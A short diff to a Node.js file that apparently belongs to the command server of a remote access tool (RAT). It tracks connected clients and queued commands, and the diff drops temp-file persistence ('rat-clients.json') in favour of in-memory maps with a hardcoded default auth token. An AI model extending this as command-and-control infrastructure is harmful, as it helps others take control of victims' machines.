@@ -1,43 +1,8 @@
 const crypto = require('crypto');
 
-// Shared storage (in production, use a database)
-// Import from heartbeat or use shared module
+// Simple in-memory storage (for production, use a database)
 let clients = new Map();
 let commands = new Map();
-
-// Import shared clients from heartbeat (simplified approach)
-// In production, use a proper database or shared storage module
-try {
-  // Try to access shared storage
-  const fs = require('fs');
-  const path = require('path');
-  const os = require('os');
-  
-  // Use temp file for sharing data between functions
-  const tempFile = path.join(os.tmpdir(), 'rat-clients.json');
-  
-  if (fs.existsSync(tempFile)) {
-    const data = JSON.parse(fs.readFileSync(tempFile, 'utf8'));
-    clients = new Map(data.clients || []);
-    commands = new Map(data.commands || []);
-  }
-  
-  // Function to save state
-  function saveState() {
-    fs.writeFileSync(tempFile, JSON.stringify({
-      clients: Array.from(clients.entries()),
-      commands: Array.from(commands.entries())
-    }));
-  }
-  
-  // Auto-save every 5 seconds
-  setInterval(saveState, 5000);
-  
-  // Export save function for other operations
-  module.exports.saveState = saveState;
-} catch (e) {
-  console.log('Shared storage not available, using in-memory');
-}
 
 const AUTH_TOKEN = process.env.AUTH_TOKEN || 'default-token-change-me';
 
